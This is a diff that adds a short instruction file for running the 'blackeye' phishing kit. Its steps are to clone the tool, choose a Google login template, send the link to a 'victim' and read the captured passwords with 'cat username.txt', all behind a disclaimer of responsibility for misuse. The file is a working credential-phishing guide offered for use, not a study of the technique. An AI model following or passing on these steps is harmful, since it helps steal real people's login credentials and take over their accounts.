@@ -1,0 +1,14 @@
+We are not responsible for any kind of misuse of this code
+Instruction are followed by commands:
+Step 1: git clone the below link.
+https://github.com/An0nUD4Y/blackeye.git
+Step 2:       
+$ ls 
+$ cd blackeye
+$ chmod +x *
+$ cd sites
+$ ls
+$ cd google(use as per your use)
+Step 6: send the link to the victim
+Step 7: once you capture the password use 
+        cat username.txt
